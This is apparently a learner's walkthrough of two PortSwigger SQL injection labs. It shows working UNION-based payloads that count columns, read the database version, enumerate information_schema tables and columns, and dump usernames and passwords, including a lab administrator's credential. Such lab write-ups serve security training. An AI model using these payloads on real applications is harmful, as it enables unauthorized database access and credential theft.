# Lab 1: SQL injection attack, querying the database type and version on MySQL and Microsoft

## Lab's description

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

**End goal:** display the database version string.

## Solution

First, I choose any type of category.

Then turn on Proxy and open Burp Suite, send your site to Repeater.

Now, I try to modify the link to determine the number of columns required.

After I try, I can see `' ORDER BY 3#` display error. That means it has 2 columns.

Now I determine which column is string data: `' UNION SELECT 'a','a'#`

So both columns are string. Expoilt payload: `' UNION SELECT 'a',@@version#`

**Source:** [Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft#)

# Lab 2: SQL injection attack, listing the database contents on non-Oracle databases

## Lab's description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

**End goal:** log in as the administrator user.

## Solution

After I determine, I can see `' ORDER BY 3#` display error. That means it has 2 string columns.

Now I look for name of database table, Most database types have a set of views called the information schema: `' UNION SELECT table_name,NULL FROM information_schema.tables`

We have lots of names here, now we search for `user` to see anything interesting. In my case, I see `users_zymndv`

Now we look for name of columns in the `users_zymndv` table: `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_zymndv'` 			
	
In my case, I can see `username_qekbsa` and `password_emjrmd`

Now we look for exactly these 2 columns in that table: ` UNION SELECT username_qekbsa, password_emjrmd FROM users_zymndv--`

I have `administrator` and `g5e586vh9k3sw4xcg9vr`

**Source:** [Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
